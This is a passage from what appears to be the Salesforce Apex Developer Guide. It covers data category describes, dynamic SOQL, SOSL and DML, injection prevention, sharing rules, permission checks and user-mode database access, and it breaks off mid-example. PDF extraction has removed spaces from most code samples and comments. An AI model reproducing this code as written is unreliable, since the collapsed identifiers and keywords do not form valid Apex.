for articles and questions in the Regions category group. For additional information about articles and questions, see “Work with Articles
and Translations” in the Salesforce online help.
To use the following example, you must:
•
Enable Salesforce Knowledge.
•
Enable the answers feature.
•
Create a data category group called Regions.
•
Assign Regions as the data category group to be used by Answers.
•
Make sure the Regions data category group is assigned to Salesforce Knowledge.
For more information on creating data category groups, see “Create and Modify Category Groups” in the Salesforce online help. For more
information on answers, see “Answers Overview” in the Salesforce online help.
publicclassDescribeDataCategoryGroupSample{
publicstaticList<DescribeDataCategoryGroupResult>describeDataCategoryGroupSample(){
List<DescribeDataCategoryGroupResult>describeCategoryResult;
try {
//Creatingthe listof sobjectsto use for the describe
//call
List<String> objType= new List<String>();
objType.add('KnowledgeArticleVersion');
objType.add('Question');
199
Working with Data in ApexApex Developer Guide

//DescribeCall
describeCategoryResult= Schema.describeDataCategoryGroups(objType);
//Usingthe resultsand retrievingthe information
for(DescribeDataCategoryGroupResultsingleResult: describeCategoryResult){
//Gettingthe nameof the category
singleResult.getName();
//Gettingthe nameof label
singleResult.getLabel();
//Gettingdescription
singleResult.getDescription();
//Gettingthe sobject
singleResult.getSobject();
}
} catch(Exceptione){
}
returndescribeCategoryResult;
}
}
publicclassDescribeDataCategoryGroupStructures{
publicstaticList<DescribeDataCategoryGroupStructureResult>
getDescribeDataCategoryGroupStructureResults(){
List<DescribeDataCategoryGroupResult>describeCategoryResult;
List<DescribeDataCategoryGroupStructureResult>describeCategoryStructureResult;
try {
//Makingthe callto the describeDataCategoryGroupsto
//getthe listof categorygroupsassociated
List<String> objType= new List<String>();
objType.add('KnowledgeArticleVersion');
objType.add('Question');
describeCategoryResult= Schema.describeDataCategoryGroups(objType);
//Creatinga listof pairobjectsto use as a parameter
//forthe describecall
List<DataCategoryGroupSobjectTypePair>pairs=
new List<DataCategoryGroupSobjectTypePair>();
//Loopingthroughtthe firstdescriberesultto create
//thelistof pairsfor the seconddescribecall
for(DescribeDataCategoryGroupResultsingleResult:
describeCategoryResult){
DataCategoryGroupSobjectTypePairp =
new DataCategoryGroupSobjectTypePair();
p.setSobject(singleResult.getSobject());
p.setDataCategoryGroupName(singleResult.getName());
pairs.add(p);
200
Working with Data in ApexApex Developer Guide

}
//describeDataCategoryGroupStructures()
describeCategoryStructureResult=
Schema.describeDataCategoryGroupStructures(pairs,false);
//Gettingdatafromthe result
for(DescribeDataCategoryGroupStructureResultsingleResult:
describeCategoryStructureResult){
//Getnameof the associatedSobject
singleResult.getSobject();
//Getthe nameof the datacategorygroup
singleResult.getName();
//Getthe nameof the datacategorygroup
singleResult.getLabel();
//Getthe descriptionof the datacategorygroup
singleResult.getDescription();
//Getthe top levelcategories
DataCategory[] toplevelCategories=
singleResult.getTopCategories();
//Recursivelyget all the categories
List<DataCategory>allCategories=
getAllCategories(toplevelCategories);
for(DataCategorycategory: allCategories){
//Getthe nameof the category
category.getName();
//Getthe labelof the category
category.getLabel();
//Getthe listof sub categoriesin the category
DataCategory[] childCategories=
category.getChildCategories();
}
}
} catch(Exceptione){
}
returndescribeCategoryStructureResult;
}
privatestaticDataCategory[]getAllCategories(DataCategory[] categories){
if(categories.isEmpty()){
returnnew DataCategory[]{};
} else{
DataCategory[] categoriesClone= categories.clone();
DataCategorycategory= categoriesClone[0];
DataCategory[]allCategories= new DataCategory[]{category};
categoriesClone.remove(0);
201
Working with Data in ApexApex Developer Guide

categoriesClone.addAll(category.getChildCategories());
allCategories.addAll(getAllCategories(categoriesClone));
returnallCategories;
}
}
}
Testing Access to All Data Categories Associated with an sObject
The following example tests the describeDataCategoryGroupSample method shown earlier. It ensures that the returned
category group and associated objects are correct.
@isTest
privateclassDescribeDataCategoryGroupSampleTest{
publicstatictestMethodvoiddescribeDataCategoryGroupSampleTest(){
List<DescribeDataCategoryGroupResult>describeResult=
DescribeDataCategoryGroupSample.describeDataCategoryGroupSample();
//Assumingthatyou haveKnowledgeArticleVersionand Questions
//associatedwithonlyone categorygroup'Regions'.
System.assert(describeResult.size()== 2,
'Theresultsshouldonlycontaintwo results:' + describeResult.size());
for(DescribeDataCategoryGroupResultresult: describeResult){
//Storingthe results
Stringname= result.getName();
Stringlabel= result.getLabel();
Stringdescription= result.getDescription();
StringobjectNames= result.getSobject();
//assertingthe valuesto makesure
System.assert(name== 'Regions',
'Incorrectnamewas returned:' + name);
System.assert(label== 'Regionsof the World',
'Incorrectlabelwas returned:' + label);
System.assert(description== 'Thisis the categorygroupfor all the regions',
'Incorrectdescriptionwas returned:' + description);
System.assert(objectNames.contains('KnowledgeArticleVersion')
|| objectNames.contains('Question'),
'IncorrectsObjectwas returned:' + objectNames);
}
}
}
This example tests the describeDataCategoryGroupStructures method. It ensures that the returned category group,
categories and associated objects are correct.
@isTest
privateclassDescribeDataCategoryGroupStructuresTest{
publicstatictestMethodvoidgetDescribeDataCategoryGroupStructureResultsTest(){
List<Schema.DescribeDataCategoryGroupStructureResult>describeResult=
DescribeDataCategoryGroupStructures.getDescribeDataCategoryGroupStructureResults();
202
Working with Data in ApexApex Developer Guide

System.assert(describeResult.size()== 2,
'Theresultsshouldonlycontain2 results:' + describeResult.size());
//Creatingcategoryinfo
CategoryInfoworld= new CategoryInfo('World', 'World');
CategoryInfoasia= new CategoryInfo('Asia', 'Asia');
CategoryInfonorthAmerica= new CategoryInfo('NorthAmerica',
'NorthAmerica');
CategoryInfosouthAmerica= new CategoryInfo('SouthAmerica',
'SouthAmerica');
CategoryInfoeurope= new CategoryInfo('Europe', 'Europe');
List<CategoryInfo>info= new CategoryInfo[]{
asia,northAmerica,southAmerica,europe
};
for (Schema.DescribeDataCategoryGroupStructureResultresult: describeResult){
Stringname= result.getName();
Stringlabel= result.getLabel();
Stringdescription= result.getDescription();
StringobjectNames= result.getSobject();
//assertingthe valuesto makesure
System.assert(name== 'Regions',
'Incorrectnamewas returned:' + name);
System.assert(label== 'Regionsof the World',
'Incorrectlabelwas returned:' + label);
System.assert(description== 'Thisis the categorygroupfor all the regions',
'Incorrectdescriptionwas returned:' + description);
System.assert(objectNames.contains('KnowledgeArticleVersion')
|| objectNames.contains('Question'),
'IncorrectsObjectwas returned:' + objectNames);
DataCategory[] topLevelCategories= result.getTopCategories();
System.assert(topLevelCategories.size()== 1,
'Incorrectnumberof top levelcategoriesreturned:' + topLevelCategories.size());
System.assert(topLevelCategories[0].getLabel()== world.getLabel()&&
topLevelCategories[0].getName()== world.getName());
//checkingif the correctchildrenare returned
DataCategory[] children= topLevelCategories[0].getChildCategories();
System.assert(children.size()== 4,
'Incorrectnumberof childrenreturned:' + children.size());
for(Integeri=0;i < children.size();i++){
System.assert(children[i].getLabel()== info[i].getLabel()&&
children[i].getName()== info[i].getName());
}
}
}
privateclassCategoryInfo{
203
Working with Data in ApexApex Developer Guide

privatefinalStringname;
privatefinalStringlabel;
privateCategoryInfo(Stringn, Stringl){
this.name= n;
this.label= l;
}
publicStringgetName(){
returnthis.name;
}
publicStringgetLabel(){
returnthis.label;
}
}
}
Dynamic SOQL
Dynamic SOQL refers to the creation of a SOQL string at run time with Apex code. Dynamic SOQL enables you to create more flexible
applications. For example, you can create a search based on input from an end user or update records with varying field names.
To create a dynamic SOQL query at run time, use the Database.query or Database.queryWithBinds methods, in one
of the following ways.
•
Return a single sObject when the query returns a single record:
sObjects = Database.query(string);
•
Return a list of sObjects when the query returns more than a single record:
List<sObject>sobjList= Database.query(string);
•
Return a list of sObjects using a map of bind variables:
List<sObject>sobjList= Database.queryWithBinds(string, bindVariablesMap,accessLevel);
The Database.query and Database.queryWithBinds methods can be used wherever an inline SOQL query can be used,
such as in regular assignment statements and for loops. The results are processed in much the same way as static SOQL queries are
processed.
With API version 55.0 and later, as part of the User Mode for Database Operations feature, use the accessLevel parameter to run
the query operation in user or system mode. The accessLevel parameter specifies whether the method runs in system mode
(AccessLevel.SYSTEM_MODE) or user mode (AccessLevel.USER_MODE). In system mode, the object and field-level
permissions of the current user are ignored, and the record sharing rules are controlled by the class sharing keywords. In user mode, the
object permissions, field-level security, and sharing rules of the current user are enforced. System mode is the default.
Dynamic SOQL results can be specified as concrete sObjects, such as Account or MyCustomObject__c, or as the generic sObject data
type. At run time, the system validates that the type of the query matches the declared type of the variable. If the query doesn’t return
the correct sObject type, a run-time error is thrown. Therefore, you don’t have to cast from a generic sObject to a concrete sObject.
Dynamic SOQL queries have the same governor limits as static queries. For more information on governor limits, see Execution Governors
and Limits on page 346.
For a full description of SOQL query syntax, see Salesforce Object Query Language (SOQL) in the SOQL and SOSL Reference.
204
Working with Data in ApexApex Developer Guide

Dynamic SOQL Considerations
You can use simple bind variables in dynamic SOQL query strings when using Database.query. Bind variables in the query must
be within the scope of the database operation. The following is allowed:
StringmyTestString= 'TestName';
List<sObject>sobjList= Database.query('SELECTId FROMMyCustomObject__cWHEREName=
:myTestString');
However, unlike inline SOQL, you can’t use bind variable fields in the query string with Database.query. The following example
isn’t supported and results in a Variabledoesnot exist error.
MyCustomObject__cmyVariable= new MyCustomObject__c(field1__c='TestField');
List<sObject>sobjList= Database.query('SELECTId FROMMyCustomObject__cWHEREfield1__c
= :myVariable.field1__c');
You can instead resolve the variable field into a string and use the string in your dynamic SOQL query:
StringresolvedField1= myVariable.field1__c;
List<sObject>sobjList= Database.query('SELECTId FROMMyCustomObject__cWHEREfield1__c
=  :resolvedField1');
(API version 57.0 and later) Another option is to use the Database.queryWithBinds method. With this method, bind variables
in the query are resolved from a Map parameter directly with a key, rather than from Apex code variables. This removes the need for the
variables to be in scope when the query is executed. This example shows a SOQL query that uses a bind variable for an Account name;
its value is passed in with the acctBinds Map.
Map<String,Object>acctBinds= new Map<String,Object>{'acctName'=> 'AcmeCorporation'};
List<Account>accts=
Database.queryWithBinds('SELECTId FROMAccountWHEREName= :acctName',
acctBinds,
AccessLevel.USER_MODE);
These considerations apply when using the Map parameter in the Database.queryWithBinds method:
•
Although map keys of type String are case-sensitive,the queryWithBinds method doesn’t support Map keys that differ only
in case. In a queryWithBinds method, comparison of Map keys is case-insensitive. If duplicate Map keys exist, the method
throws a runtime QueryException. This example throws this runtime exception: System.QueryException:The
bindMapconsistsof duplicatecase-insensitivekeys:[Acctname,acctName].
Map<String,Object>bindVars= new Map<String,Object>{'acctName'=> 'AcmeCorporation'};
bindVars.put('Acctname','Foo');
stringquery= 'SelectId fromContactwhereNamelike:acctName';
List<Contact>contacts=  Database.queryWithBinds(query,bindVars,AccessLevel.USER_MODE);
•
Map keys must follow naming standards: they must start with an ASCII letter, can’t start with a number, must not use reserved
keywords, and must adhere to variable naming requirements.
•
Although currently supported, Salesforce recommends against using the dot notation with Map keys.
SOQL Injection
SOQL injection is a technique by which a user causes your application to execute database methods you didn’t intend by passing SOQL
statements into your code. This can occur in Apex code whenever your application relies on end-user input to construct a dynamic SOQL
statement and you don’t handle the input properly.
205
Working with Data in ApexApex Developer Guide

To prevent SOQL injection, use the escapeSingleQuotes method. This method adds the escape character (\) to all single quotation
marks in a string that is passed in from a user. The method ensures that all single quotation marks are treated as enclosing strings, instead
of database commands.
Additional Dynamic SOQL Methods
The Dynamic SOQL examples in this topic show how to use the Database.query and Database.queryWithBinds methods.
These methods also use Dynamic SOQL:
•
Database.countQuery and Database.countQueryWithBinds: Return the number of records that a dynamic SOQL
query would return when executed.
•
Database.getQueryLocator and Database.getQueryLocatorWithBinds: Create a QueryLocator object
used in batch Apex or Visualforce.
SEE ALSO:
Apex Reference Guide: System.Database Methods
Dynamic SOSL
Dynamic SOSL refers to the creation of a SOSL string at run time with Apex code. Dynamic SOSL enables you to create more flexible
applications. For example, you can create a search based on input from an end user, or update records with varying field names.
To create a dynamic SOSL query at run time, use the search query method. For example:
List<List<sObject>>myQuery= search.query(SOSL_search_string);
The following example exercises a simple SOSL query string.
Stringsearchquery='FIND\'Edge*\'INALL FIELDSRETURNINGAccount(id,name),Contact,Lead';
List<List<SObject>>searchList=search.query(searchquery);
Dynamic SOSL statements evaluate to a list of lists of sObjects, where each list contains the search results for a particular sObject type.
The result lists are always returned in the same order as they were specified in the dynamic SOSL query. From the example above, the
results from Account are first, then Contact, then Lead.
The search query method can be used wherever an inline SOSL query can be used, such as in regular assignment statements and
for loops. The results are processed in much the same way as static SOSL queries are processed.
Dynamic SOSL queries have the same governor limits as static queries. For more information on governor limits, see Execution Governors
and Limits on page 346.
For a full description of SOSL query syntax, see Salesforce Object Search Language (SOSL) in the SOQL and SOSL Reference.
Use Dynamic SOSL to Return Snippets
To provide more context for records in search results, use the SOSL WITHSNIPPET clause. Snippets make it easier to identify the
content you’re looking for. For information about how snippets are generated, see WITH SNIPPET in the SOQL and SOSL Reference.
To use the SOSL WITHSNIPPET clause in a dynamic SOSL query at run time, use the Search.find method.
Search.SearchResultssearchResults= Search.find(SOSL_search_string);
206
Working with Data in ApexApex Developer Guide

This example exercises a simple SOSL query string that includes a WITHSNIPPET clause. The example calls System.debug()
to print the returned titles and snippets. Your code would display the titles and snippets in a Web page.
Search.SearchResultssearchResults= Search.find('FIND\'test\'IN ALL FIELDSRETURNING
KnowledgeArticleVersion(id,titleWHEREPublishStatus= \'Online\'AND Language= \'en_US\')
WITHSNIPPET(target_length=120)');
List<Search.SearchResult>articlelist= searchResults.get('KnowledgeArticleVersion');
for (Search.SearchResultsearchResult: articleList){
KnowledgeArticleVersionarticle= (KnowledgeArticleVersion)searchResult.getSObject();
System.debug(article.Title);
System.debug(searchResult.getSnippet());
}
SOSL Injection
SOSL injection is a technique by which a user causes your application to execute database methods you did not intend by passing SOSL
statements into your code. A SOSL injection can occur in Apex code whenever your application relies on end-user input to construct a
dynamic SOSL statement and you do not handle the input properly.
To prevent SOSL injection, use the escapeSingleQuotes method. This method adds the escape character (\) to all single quotation
marks in a string that is passed in from a user. The method ensures that all single quotation marks are treated as enclosing strings, instead
of database commands.
Dynamic DML
In addition to querying describe information and building SOQL queries at runtime, you can also create sObjects dynamically, and insert
them into the database using DML.
To create a new sObject of a given type, use the newSObject method on an sObject token. Note that the token must be cast into a
concrete sObject type (such as Account). For example:
// Get a new account
Accounta = new Account();
// Get the tokenfor the account
Schema.sObjectTypetokenA= a.getSObjectType();
// The followingproducesan errorbecausethe tokenis a genericsObject,not an Account
// Accountb = tokenA.newSObject();
// The followingworksbecausethe tokenis castbackintoan Account
Accountb = (Account)tokenA.newSObject();
Though the sObject token tokenA is a token of Account, it is considered an sObject because it is accessed separately. It must be cast
back into the concrete sObject type Account to use the newSObject method. For more information on casting, see Classes and
Casting on page 116.
You can also specify an ID with newSObject to create an sObject that references an existing record that you can update later. For
example:
SObjects = Database.query('SELECTId FROMaccountLIMIT1')[0].getSObjectType().
newSObject([SELECTId FROMAccountLIMIT1][0].Id);
See SObjectType Class.
207
Working with Data in ApexApex Developer Guide

Dynamic sObject Creation Example
This example shows how to obtain the sObject token through the Schema.getGlobalDescribe method and then creates a
new sObject using the newSObject method on the token. This example also contains a test method that verifies the dynamic creation
of an account.
publicclassDynamicSObjectCreation{
publicstaticsObjectcreateObject(StringtypeName){
Schema.SObjectTypetargetType= Schema.getGlobalDescribe().get(typeName);
if (targetType== null) {
// throwan exception
}
// Instantiatean sObjectwiththe typepassedin as an argument
//  at run time.
returntargetType.newSObject();
}
}
@isTest
privateclassDynamicSObjectCreationTest{
statictestmethodvoidtestObjectCreation(){
StringtypeName= 'Account';
StringacctName= 'Acme';
// Createa new sObjectby passingthe sObjecttypeas an argument.
Accounta = (Account)DynamicSObjectCreation.createObject(typeName);
System.assertEquals(typeName,String.valueOf(a.getSobjectType()));
// Set the accountnameand insertthe account.
a.Name= acctName;
inserta;
// Verifythe new sObjectgot inserted.
Account[]b = [SELECTNamefromAccountWHEREName= :acctName];
system.assert(b.size()> 0);
}
}
Setting and Retrieving Field Values
Use the get and put methods on an object to set or retrieve values for fields using either the API name of the field expressed as a
String, or the field's token. In the following example, the API name of the field AccountNumber is used:
SObjects = [SELECTAccountNumberFROMAccountLIMIT1];
Objecto = s.get('AccountNumber');
s.put('AccountNumber', 'abc');
The following example uses the AccountNumber field's token instead:
Schema.DescribeFieldResultdfr = Schema.sObjectType.Account.fields.AccountNumber;
Sobjects = Database.query('SELECTAccountNumberFROMAccountLIMIT1');
s.put(dfr.getsObjectField(),'12345');
208
Working with Data in ApexApex Developer Guide

The Object scalar data type can be used as a generic data type to set or retrieve field values on an sObject. This is equivalent to the
anyType field type. Note that the Object data type is different from the sObject data type, which can be used as a generic type for any
sObject.
Note: Apex classes and triggers saved (compiled) using API version 15.0 and higher produce a runtime error if you assign a String
value that is too long for the field.
Setting and Retrieving Foreign Keys
Apex supports populating foreign keys by name (or external ID) in the same way as the API. To set or retrieve the scalar ID value of a
foreign key, use the get or put methods.
To set or retrieve the record associated with a foreign key, use the getSObject and putSObject methods. Note that these
methods must be used with the sObject data type, not Object. For example:
SObjectc =
Database.query('SELECTId, FirstName,AccountId,Account.NameFROMContactLIMIT1');
SObjecta = c.getSObject('Account');
There is no need to specify the external ID for a parent sObject value while working with child sObjects. If you provide an ID in the parent
sObject, it is ignored by the DML operation. Apex assumes the foreign key is populated through a relationship SOQL query, which always
returns a parent object with a populated ID. If you have an ID, use it with the child object.
For example, suppose that custom object C1 has a foreign key C2__c that links to a parent custom object C2. You want to create a C1
object and have it associated with a C2 record named 'AW Computing' (assigned to the value C2__r). You do not need the ID of the
'AW Computing' record, as it is populated through the relationship of parent to child. For example:
insertnew C1__c(Name= 'x', C2__r= new C2__c(Name= 'AW Computing'));
If you had assigned a value to the ID for C2__r, it would be ignored. If you do have the ID, assign it to the object (C2__c), not the
record.
You can also access foreign keys using dynamic Apex. The following example shows how to get the values from a subquery in a
parent-to-child relationship using dynamic Apex:
StringqueryString= 'SELECTId, Name,' +
'(SELECTFirstName,LastNameFROMContactsLIMIT1) FROMAccount';
SObject[]queryParentObject= Database.query(queryString);
for (SObjectparentRecord: queryParentObject){
ObjectParentFieldValue= parentRecord.get('Name');
// Preventa nullrelationshipfrombeingaccessed
SObject[]childRecordsFromParent= parentRecord.getSObjects('Contacts');
if (childRecordsFromParent!= null) {
for (SObjectchildRecord: childRecordsFromParent){
ObjectChildFieldValue1= childRecord.get('FirstName');
ObjectChildFieldValue2= childRecord.get('LastName');
System.debug('AccountName:' + ParentFieldValue+
'. ContactName:'+ ChildFieldValue1+ ' ' + ChildFieldValue2);
}
}
}
209
Working with Data in ApexApex Developer Guide

Apex Security and Sharing
When you use Apex, the security of your code is critical. You'll need to add user permissions for Apex classes and enforce sharing rules.
Read on to learn about Apex managed sharing and get some security tips.
Enforce Sharing Rules
Apex generally runs in system context, so the current user’s permissions and field-level security aren’t taken into account during
code execution. You can use sharing rules to extend a user’s access to specific records, and then enforce sharing rules by using the
withsharing keyword on a class declaration. If you declare a class with the withoutsharing keyword, then sharing
rules aren’t enforced.
Enforce Object and Field Permissions
Apex generally runs in system context, so the current user's permissions and field-level security (FLS) aren’t taken into account during
code execution. To enforce the FLS and object permissions of the current user, you can enforce user mode for database operations
and SOQL queries. You can also check the current user's permissions for an object or a field, and then perform a specific DML operation
or a query only if the user has sufficient permissions.
Enforce User Mode for Database Operations
You can run database operations in user mode rather than in the default system mode by using SOQL or SOSL queries with special
keywords or by using DML method overloads.
Enforce Security with the stripInaccessible Method
Use the stripInaccessible method to enforce field-level and object-level data protection. This method can be used to strip
the fields and relationship fields from query and subquery results that the user can’t access. The method can also be used to remove
inaccessible sObject fields before DML operations to avoid exceptions and to sanitize sObjects that have been deserialized from an
untrusted source.
Filter SOQL Queries Using WITH SECURITY_ENFORCED
Use the WITHSECURITY_ENFORCED clause to enable field- and object-level security permissions checking for SOQLSELECT
queries in Apex code, including subqueries and cross-object relationships.
Class Security
Understanding Apex Managed Sharing
Sharing is the act of granting a user or group of users permission to perform a set of actions on a record or set of records. Sharing
access can be granted using the Salesforce user interface and Lightning Platform, or programmatically using Apex.
Security Tips for Apex and Visualforce Development
Enforce Sharing Rules
Apex generally runs in system context, so the current user’s permissions and field-level security aren’t taken into account during code
execution. You can use sharing rules to extend a user’s access to specific records, and then enforce sharing rules by using the with
sharing keyword on a class declaration. If you declare a class with the withoutsharing keyword, then sharing rules aren’t
enforced.
Note: Apex code that is executed with the executeAnonymous call and Connect in Apex always execute using the sharing
rules of the current user. See Anonymous Blocks on page 262.
Apex developers must take care not to inadvertently expose sensitive data that would normally be hidden from users by user permissions,
field-level security, or organization-wide defaults. They must be particularly careful with Web services, which can be restricted by
permissions, but execute in system context after they’re initiated.
210
Working with Data in ApexApex Developer Guide

Most of the time, system context provides the correct behavior for system-level operations such as triggers and Web services that need
access to all data in an organization. However, you can also specify that particular Apex classes should enforce the sharing rules that
apply to the current user.
Note:  Enforcing sharing rules by using the withsharing keyword doesn’t enforce the user’s permissions and field-level
security. Apex always has access to all fields and objects in an organization, ensuring that code won’t fail to run because of fields
or objects that are hidden from a user.
This example has two classes, the first class (CWith) enforces sharing rules while the second class (CWithout) doesn’t. The CWithout
class calls a method from the first, which runs with sharing rules enforced. The CWithout class contains an inner class, in which code
executes under the same sharing context as the caller. It also contains a class that extends it, which inherits its without sharing setting.
publicwithsharingclassCWith{
// All codein thisclassoperateswithenforcedsharingrules.
Accounta = [SELECT. . . ];
publicstaticvoidm() { . . . }
static{
. . .
}
{
. . .
}
publicvoidc() {
. . .
}
}
publicwithoutsharingclassCWithout{
// All codein thisclassignoressharingrulesand operates
// as if the contextuserhas the ModifyAll Datapermission.
Accounta = [SELECT. . . ];
. . .
publicstaticvoidm() {
. . .
// ThiscallintoCWithoperateswithenforcedsharingrules
// for the contextuser.Whenthe callfinishes,the codeexecution
// returnsto withoutsharingmode.
CWith.m();
}
publicclassCInner{
// All codein thisclassexecuteswiththe samesharingcontext
// as the codethatcallsit.
// Innerclassesare separatefromouterclasses.
. . .
// Again,thiscallintoCWithoperateswithenforcedsharingrules
211
Working with Data in ApexApex Developer Guide

// for the contextuser,regardlessof the classthatinitiallycalledthisinner
class.
// Whenthe callfinishes,the codeexecutionreturnsto the sharingmodethatwas
usedto callthisinnerclass.
CWith.m();
}
publicclassCInnerWithOutextendsCWithout{
// All codein thisclassignoressharingrulesbecause
// thisclassextendsa parentclassthatignoressharingrules.
}
}
Warning:  Because a class declared as withsharing can call a class declared as withoutsharing, you may still have
to implement class-level security. In addition, all SOQL and SOSL queries that use Pricebook2 ignore the withsharing
keyword. All price books are returned, regardless of the applied sharing rules.
Enforcing the current user's sharing rules can impact:
•
SOQL and SOSL queries. A query can return fewer rows than it would operating in system context.
•
DML operations. An operation can fail because the current user doesn't have the correct permissions. For example, if the user specifies
a foreign key value that exists in the organization, but which the current user doesn’t have access to, then the DML operation fails.
SEE ALSO:
Use the with sharing, without sharing, and inherited sharing Keywords
Salesforce Help: Sharing Rules
Enforce Object and Field Permissions
Apex generally runs in system context, so the current user's permissions and field-level security (FLS) aren’t taken into account during
code execution. To enforce the FLS and object permissions of the current user, you can enforce user mode for database operations and
SOQL queries. You can also check the current user's permissions for an object or a field, and then perform a specific DML operation or
a query only if the user has sufficient permissions.
Enforce User Mode
 To enforce field-level security and object permissions of the current user, you can specify user mode access for database operations and
SOQL queries. See Enforce User Mode for Database Operations.
Check Field-Level Permissions
You can also enforce object-level and field-level permissions in your code by explicitly calling the access control methods of the
Schema.DescribeSObjectResult and the Schema.DescribeFieldResult classes. These methods check the current user's access permission
levels so that you can perform a specific DML operation or a query only if the user has sufficient permissions.
For example, you can call the isAccessible, isCreateable, or isUpdateable methods of
Schema.DescribeSObjectResult to verify whether the current user has read, create, or update access to an sObject, respectively.
Similarly, Schema.DescribeFieldResult exposes these access control methods that you can call to check the current user's
read, create, or update access for a field. In addition, you can call the isDeletable method provided by
Schema.DescribeSObjectResult to check if the current user has permission to delete a specific sObject.
These examples call the access control methods.
212
Working with Data in ApexApex Developer Guide

To check the field-level update permission of the contact's email field before updating it:
if (Schema.sObjectType.Contact.fields.Email.isUpdateable()){
// Updatecontact
}
To check the field-level create permission of the contact's email field before creating a new contact:
if (Schema.sObjectType.Contact.fields.Email.isCreateable()){
// Createnew contact
}
To check the field-level read permission of the contact's email field before querying for this field:
if (Schema.sObjectType.Contact.fields.Email.isAccessible()){
Contactc = [SELECTEmailFROMContactWHEREId= :Id];
}
To check the object-level permission for the contact before deleting the contact:
if (Schema.sObjectType.Contact.isDeletable()){
// Deletecontact
}
Considerations
•
Object-level and field-level permissions are distinct from sharing rules, which enforce specific record access. They can coexist. If
sharing rules are defined in Salesforce, you can enforce them at the class level by declaring the class with the withsharing
keyword. See Use the with sharing, without sharing, and inherited sharing Keywords. If you call the Schema.DescribeSObjectResult
and Schema.DescribeFieldResult access control methods, the verification of object and field-level permissions is performed in addition
to the sharing rules that are in effect. Sometimes, the access level granted by a sharing rule can conflict with an object-level or
field-level permission. In that case, object-level and field-level permissions take precedence over sharing rules.
•
Orgs with Experience Cloud sites enabled provide various settings to hide a user's personal information from other users. See Manage
Personal User Information Visibility and Share Personal Contact Information Within Experience Cloud Sites. These settings aren’t
enforced in Apex, even with security features such as the WITHUSER_MODE clause or the stripInaccessible method.
To hide specific fields on the User object in Apex, follow the example code outlined in Comply with a User’s Personal Information
Visibility Settings.
•
Automated Process users can’t perform Object and FLS checks in custom code unless appropriate permission sets are explicitly
applied to those users.
SEE ALSO:
Salesforce Help: Set Up Your Users’ Object, User, and Field Permissions
Enforce User Mode for Database Operations
You can run database operations in user mode rather than in the default system mode by using SOQL or SOSL queries with special
keywords or by using DML method overloads.
Apex code runs in system mode by default, which means that it runs with substantially elevated permissions over the user running the
code. To enhance the security context of Apex, you can specify user-mode access for database operations. Field-level security (FLS) and
object permissions of the running user are respected in user mode, unlike in system mode. User mode always applies sharing rules, but
in system mode they’re controlled by sharing keywords on the class. See Use the with sharing, without sharing, and inherited sharing
Keywords.
213
Working with Data in ApexApex Developer Guide

You can indicate the mode of the operation by using WITHUSER_MODE or WITHSYSTEM_MODE in your SOQL or SOSL query.
This example specifies user mode in SOQL.
List<Account>acc = [SELECTId FROMAccountWITHUSER_MODE];
Salesforce recommends that you enforce Field Level Security (FLS) by using WITHUSER_MODE rather than WITH
SECURITY_ENFORCED because of these additional advantages.
•
WITHUSER_MODE accounts for polymorphic fields like Owner and Task.whatId.
•
WITHUSER_MODE processes all clauses in the SOQL SELECT statement including the WHERE clause.
•
WITHUSER_MODE finds all FLS errors in your SOQL query, while WITHSECURITY_ENFORCED finds only the first error.
Further, in user mode, you can use the getInaccessibleFields() method on QueryException to examine the full set of
access errors.
Note:  Avoid specifying access modes, either with special keywords or the AccessLevel class, in the same query as a WITH
SECURITY_ENFORCED clause. Salesforce recommends that you specify either system mode or user mode, and remove any
redundant WITHSECURITY_ENFORCED clauses.
Database operations can specify either user or system mode. This example inserts a new account in user mode.
Accountacc = new Account(Name='test');
insertas useracc;
The AccessLevel class represents the two modes in which Apex runs database operations. Use this class to define the execution
mode as user mode or system mode. An optional accessLevel parameter in Database and Search methods specifies whether the
method runs in system mode (AccessLevel.SYSTEM_MODE) or user mode (AccessLevel.USER_MODE).
Use these overloaded methods to perform DML and query operations.
•
Database.query method. See Dynamic SOQL.
•
Database.getQueryLocator methods
•
Database.countQuery method
•
Search.query method
•
Database DML methods (insert, update, upsert, merge, delete, undelete, and convertLead). Includes the
*Immediate and *Async methods, such as insertImmediate and deleteAsync.
Note:  When Database DML methods are run with AccessLevel.USER_MODE, you can access errors via
SaveResult.getErrors().getFields(). With insertas user, you can use the DMLException method
getDmlFieldNames() to obtain the fields with FLS errors.
These methods require the accessLevel parameter.
•
Database.queryWithBinds
•
Database.getQueryLocatorWithBinds
•
Database.countQueryWithBinds
Example:  This example assumes that the context user does not have view and edit permissions on Account.AnnualRevenue.
An exception is thrown on the insert operation and the inaccessible fields are retrieved using getDmlFieldNames().
try {
List<Account>accts= new Account[]{newAccount(name='foo',AnnualRevenue=2000)};
Database.insert(accts,AccessLevel.USER_MODE);// throwsan exception
Assert.fail('DmlExceptionexpected');
} catch(DmlExceptiondex){
Assert.isTrue(dex.getMessage()
214
Working with Data in ApexApex Developer Guide

.contains(
'Operationfaileddue to fieldsbeinginaccessibleon Sobject<objectname>,
checkerrorson Exceptionor Result!'
)
);
Assert.isTrue(dex.getDmlFieldNames(0).contains('AnnualRevenue'));
}
Using Permission Sets to Enforce Security in DML and Search Operations (Developer Preview)
In Developer Preview, you can specify a permission set that is used to augment the field-level and object-level security for database and
search operations. Run the AccessLevel.withPermissionSetId() method with a specified permission set ID. Specific user
mode DML operations that are performed with that AccessLevel, respect the permissions in the specified permission set, in addition
to the running user’s permissions.
This example runs the AccessLevel.withPermissionSetId() method with the specified permission set and inserts a
custom object.
@isTest
publicwithsharingclassElevateUserModeOperations_Test{
@isTest
staticvoidobjectCreatePermViaPermissionSet(){
Profilep = [SELECTId FROMProfileWHEREName='MinimumAccess- Salesforce'];
Useru = new User(Alias= 'standt',Email='standarduser@testorg.com',
EmailEncodingKey='UTF-8',LastName='Testing',LanguageLocaleKey='en_US',
LocaleSidKey='en_US',ProfileId= p.Id,
TimeZoneSidKey='America/Los_Angeles',
UserName='standarduser'+ DateTime.now().getTime()+ '@testorg.com');
System.runAs(u){
try {
Database.insert(newAccount(name='foo'),AccessLevel.User_mode);
Assert.fail();
} catch(SecurityExceptionex) {
Assert.isTrue(ex.getMessage().contains('Account'));
}
//GetID of previouslycreatedpermissionset named'AllowCreateToAccount'
Id permissionSetId= [SelectId fromPermissionSet
whereName= 'AllowCreateToAccount'limit1].Id;
Database.insert(newAccount(name='foo'),
AccessLevel.User_mode.withPermissionSetId(permissionSetId));
// The elevatedaccesslevelis not persistedto subsequentoperations
try {
Database.insert(newAccount(name='foo2'),AccessLevel.User_mode);
Assert.fail();
} catch(SecurityExceptionex) {
Assert.isTrue(ex.getMessage().contains('Account'));
